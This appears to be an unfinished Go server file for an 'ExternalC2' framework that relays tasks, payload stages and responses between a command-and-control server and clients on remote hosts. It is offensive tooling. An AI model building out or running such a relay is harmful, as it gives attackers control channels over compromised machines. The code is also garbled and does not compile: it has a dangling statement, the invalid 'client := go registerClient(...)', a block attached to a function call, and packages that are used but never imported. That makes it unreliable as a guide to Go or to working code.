//go:build server

package main

import (
	"log"
	"sync"
	"time"

	"externalc2/pkg/component"
	"externalc2/pkg/config/serverconfig"
	"externalc2/pkg/external"
	"externalc2/pkg/transport"
	"externalc2/pkg/utils/logging"
)

func genComponentInfo(serverConfig []byte) component.Component {
	var Component component.Component
	parsedConfig := serverConfig.ParseConfig(serverConfig)
	log.SetPrefix(logging.GetLogPrefix())
	log.Println("Started ExternalC2 Framework") // TODO: banner
	Component.Config = parsedConfig
	Component.ComponentId = Component.Config.Id
	Component.SelfComponentId = Component.ComponentId
	Component.


	return Component
}

func registerClient(Component *component.Component, clients []transport.RegisteredComponent) (transport.RegisteredComponent, []transport.RegisteredComponent) {
		//   client registration loop
	// 1. client requests new session after connecting
	// 2. connect to external c2
	// 3. send client options
	// 4. request stage
	// 5. relay stage to client
	// 6. recieve metadata from client
	// 7. retrieve metadata from client
	var client transport.RegisteredComponent
	var err error
	client.Transport, _, err = transport.PrepareTransport(Component, []string{})
	if err != nil {
		log.Fatalln("transport failed to initalize: ", err)
	}

	client.Id = Component.ComponentId
	client.TskChkTimer = Component.Config.TskChkTimer
	log.Println(client) // debug
	clients = append(clients, client)

	return client, clients
}

func clientLoop(client *transport.RegisteredComponent) {
    //   registered client loop
	// 1. Retrieve task from server
	// 2. Relay task to client
	// 3. Retrieve response from client; on error: GOTO 5a
	// 4. Relay response to server
	// 5. GOTO 1 IF no error on 3
	// 5a. ==Error reading from client==
	// 6. Relay error to server that host exited
	// 7. Terminate client's channel to C2
	for {
		csCommand, err := external.RetrieveInstructionRequest(client) {
			var requestInstruction instructions.Instruction(client)
			if err != nil{
				log.Println("invalid instruction receieved: ", err)
				log.Println("[dbginstructframe]: ", requestInstruction)
				time.Sleep(time.Duration(client.TskChkTimer))
				break
			}
			// go transaction.RouteClientInstruction(client, requestInstruction)
			transaction.RouteClientInstruction(client, requestInstruction)   // Routes instrution to client
			time.Sleep(time.Duration(client.TskChkTimer))
            break
		}
	}
}

func main() {
	var clients []transport.RegisteredComponent
	log.SetPrefix(logging.GetLogPrefix())
	// TODO: Make this real, support crypto
	serverConfig := []byte(`[server]
	id = ` + idgen.GenerateComponentId() + `
	transport_name = http_quic
	task_check_time = 60
	`)
	Component = genComponentInfo(serverConfig)
	// Start of registration process for client

	// TODO: Make a loop for every client reg listener
	client := go registerClient(&Component, clients)

	wg := sync.WaitGroup{}
	// As an external C2 controller, we are awaiting a new command from the C2
	for index, registeredClient := range clients {
		log.Println("Registered ", index, "clients")
		log.Println("Starting execution for ", registeredClient.Id)
		go clientLoop(&registeredClient)
	}
	wg.Wait()

	for {
		select {}
	}  // run forever
}